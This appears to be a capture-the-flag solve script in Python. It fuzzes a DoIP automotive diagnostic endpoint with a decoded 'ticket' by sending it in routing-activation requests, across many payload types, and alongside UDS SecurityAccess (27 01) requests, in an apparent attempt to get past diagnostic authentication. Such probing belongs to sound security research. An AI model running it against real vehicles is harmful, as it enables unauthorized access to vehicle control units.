import sys, base64, struct, binascii
sys.path.insert(0,"04_SOLVE/uds")
from doip import DoIP
TB="3I-tVCsWTfSqqZE-ZrqsQgAAAABq98emLAlQ9atV-YO71pCxdYJwcA"
ticket=base64.urlsafe_b64decode(TB+"="*(-len(TB)%4))
NAMES={0x0000:"genericNack",0x0004:"vehIdentRes",0x0006:"RA_res",0x8001:"diag",0x8002:"ack",0x8003:"nack"}

def send(ptype, payload, label, wait=1.5, reads=3):
    d=DoIP(); d.connect()
    d.s.sendall(DoIP.pkt(ptype,payload))
    out=[]; d.s.settimeout(wait)
    try:
        for _ in range(reads):
            r=d.recv_pkt()
            if r is None: break
            out.append((NAMES.get(r[0],hex(r[0])), r[1].hex()[:80]))
    except Exception: pass
    d.close()
    print(f"  {label:40s} -> {out}")

base_ra=struct.pack(">H",0x0E00)+b"\x00"+b"\x00"*4

print("=== ticket as RA OEM+extra (payload 7 / 11 only accepted) ===")
for cut in [ticket[:4], ticket[16:20], ticket[24:28]]:
    send(0x0005, struct.pack(">H",0x0E00)+b"\x00"+cut, f"RA oem={cut.hex()}")

print("=== ticket as whole payload of various ptypes ===")
for pt in [0x0001,0x0005,0x0007,0x4001,0x4003,0x8001,0x8002,0x8003,0xE001,0xE002,0xF001]:
    send(pt, ticket, f"ptype={pt:#06x} ticket")

print("=== diag msg with SA=0x1220 / 0xE442 carrying ticket ===")
for sa,ta in [(0x0E00,0xE442),(0x1220,0xE442),(0xE442,0x1220),(0x0E00,0x1220),(0x0E00,0x1000)]:
    send(0x8001, struct.pack(">H",sa)+struct.pack(">H",ta)+ticket, f"diag SA={sa:#06x} TA={ta:#06x} +ticket")

print("=== ticket prefix/suffix on 27 01 ===")
for name,data in [("ticket+2701",ticket+bytes.fromhex("2701")),
                  ("2701+ticket",bytes.fromhex("2701")+ticket),
                  ("2701+tag",bytes.fromhex("2701")+ticket[24:]),
                  ("2701+nonce",bytes.fromhex("2701")+ticket[:16])]:
    send(0x8001, struct.pack(">H",0x0E00)+struct.pack(">H",0xE442)+data, name)
